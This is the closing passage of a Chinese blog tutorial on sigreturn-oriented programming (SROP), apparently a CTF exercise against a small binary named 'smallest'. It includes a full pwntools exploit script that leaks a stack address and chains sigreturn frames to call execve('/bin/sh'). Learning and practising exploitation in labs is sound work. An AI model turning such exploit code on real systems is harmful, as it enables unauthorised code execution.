class="built_in">len</span>(frame_payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>可以看到 payload_exe 的长度为 264 个字节，也就是十六进制的 0x108 个字节，也就是说我们将/bin/sh 字符串部署在 payload_exe 后面就可以了，也就是说/bin/sh 字符串的地址要大于 stack_addr + 0x108 的地址，当然尽可能的接近这个地址就可以了，不需要将偏移调的太大。所以凑个整我们就把/bin/sh 字符串放在 stack_addr + 0x120 的位置就好了<br>那么我们的 payload 就需要更改一下了，因为我们的/bin/sh 字符串要同 payload_exe 一起写进栈中，那么/bin/sh 字符串前面的空位就需要填充一下：</p>
<blockquote>
<p>payload = payload_exe + (0x120 - len(payload_exe)) * ‘\x00’ + ‘/bin/sh\x00’</p>
</blockquote>
<p>这样一来我们完整的 EXP 就构筑好了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">small = ELF(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">syscall_ret = <span class="number">0x00000000004000BE</span> <span class="comment">#源代码syscall处地址</span></span><br><span class="line">start_addr = <span class="number">0x00000000004000B0</span>  <span class="comment">#源代码xor rax,rax处地址</span></span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span>  <span class="comment">#部署三个start_addr，完成三次read函数的调用</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#覆盖第二个start_addr的最后一个字节变成0x00000000004000B3，越过对rax寄存器的清零，还使得rax寄存器值变为1</span></span><br><span class="line">sh.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br><span class="line">stack_addr = u64(sh.recv()[<span class="number">8</span>:<span class="number">16</span>]) <span class="comment">#接收接下要要部署的栈顶地址</span></span><br><span class="line">log.success(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">read = SigreturnFrame()</span><br><span class="line">read.rax = constants.SYS_read <span class="comment">#read函数系统调用号</span></span><br><span class="line">read.rdi = <span class="number">0</span>  <span class="comment">#read函数一参</span></span><br><span class="line">read.rsi = stack_addr  <span class="comment">#read函数二参</span></span><br><span class="line">read.rdx = <span class="number">0x400</span>  <span class="comment">#read函数三参</span></span><br><span class="line">read.rsp = stack_addr  <span class="comment">#和rsi寄存器中的值保持一致，确保read函数写的时候rsp指向stack_addr</span></span><br><span class="line">read.rip = syscall_ret <span class="comment">#使得rip指向syscall的位置，在部署好read函数之后能直接调用</span></span><br><span class="line">payload = p64(start_addr) + p64(syscall_ret) + <span class="built_in">str</span>(read)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])  <span class="comment">#输入15个字节使得rax寄存器的值为15，进行sigreturn调用</span></span><br><span class="line"></span><br><span class="line">execve = SigreturnFrame()</span><br><span class="line">execve.rax = constants.SYS_execve</span><br><span class="line"><span class="comment"># &quot;/bin/sh&quot;字符串地址，这里为了能够让exp3.1正常执行，所以直接给了0x120，下面会将为什么是0x120</span></span><br><span class="line">execve.rdi = stack_addr + <span class="number">0x120</span></span><br><span class="line">execve.rsi = <span class="number">0x0</span> <span class="comment">#execve函数二参</span></span><br><span class="line">execve.rdx = <span class="number">0x0</span> <span class="comment">#execve函数二参</span></span><br><span class="line">execve.rsp = stack_addr</span><br><span class="line">execve.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + p64(syscall_ret) + <span class="built_in">str</span>(execve)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(frame_payload)</span><br><span class="line"><span class="comment"># 将execve函数调用和/bin/sh字符串一起部署到栈中</span></span><br><span class="line">payload = frame_payload + (<span class="number">0x120</span> - <span class="built_in">len</span>(frame_payload)) * <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Cyberangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://cyberangel.cn/2020/08/24/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-10%EF%BC%89-%E9%AB%98%E7%BA%A7ROP-SROP/">https://cyberangel.cn/2020/08/24/PWN入门（1-3-10）-高级ROP-SROP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://cyberangel.cn" target="_blank">Cyberangel-blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/08/24/Linux32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Linux32位系统调用号</div></div></a></div><div class="next-post pull-right"><a href="/2020/08/23/C++%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">C++运算符优先级</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#signal-%E6%9C%BA%E5%88%B6"><span class="toc-number">1.</span> <span class="toc-text">signal 机制</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">攻击原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-shell"><span class="toc-number">3.1.</span> <span class="toc-text">获取 shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#system-call-chains"><span class="toc-number">3.2.</span> <span class="toc-text">system call chains</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%BB%AD"><span class="toc-number">3.3.</span> <span class="toc-text">后续</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">3.4.</span> <span class="toc-text">利用工具</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%83%85%E5%86%B5"><span class="toc-number">4.</span> <span class="toc-text">使用情况</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">5.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95"><span class="toc-number">6.</span> <span class="toc-text">第一次尝试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%B0%9D%E8%AF%95"><span class="toc-number">7.</span> <span class="toc-text">第二次尝试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E4%BD%93%E6%80%9D%E8%B7%AF"><span class="toc-number">8.</span> <span class="toc-text">总体思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6-write-%E5%87%BD%E6%95%B0%E6%89%93%E5%8D%B0%E6%A0%88%E5%9C%B0%E5%9D%80"><span class="toc-number">8.1.</span> <span class="toc-text">控制 write 函数打印栈地址</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-sigreturn-%E5%AF%B9-read-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8%E8%BF%9B%E8%A1%8C%E9%83%A8%E7%BD%B2"><span class="toc-number">8.1.1.</span> <span class="toc-text">使用 sigreturn 对 read 函数调用的寄存器进行部署</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-sigreturn-%E5%AF%B9-execve-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8%E8%BF%9B%E8%A1%8C%E9%83%A8%E7%BD%B2"><span class="toc-number">8.1.2.</span> <span class="toc-text">使用 sigreturn 对 execve 函数调用的寄存器进行部署</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By Cyberangel</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">为世界上所有美好而战！！！</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://cyberangel.cn/2020/08/24/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-10%EF%BC%89-%E9%AB%98%E7%BA%A7ROP-SROP/'
    this.page.identifier = '2020/08/24/PWN入门（1-3-10）-高级ROP-SROP/'
    this.page.title = 'PWN入门（1-3-10）-高级ROP-SROP'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Disqus' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script><script>if (window.DISQUSWIDGETS === undefined) {
  var d = document, s = d.createElement('script');
  s.src = 'https://.disqus.com/count.js';
  s.id = 'dsq-count-scr';
  (d.head || d.body).appendChild(s);
} else {
  DISQUSWIDGETS.getCount({reset: true});
}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>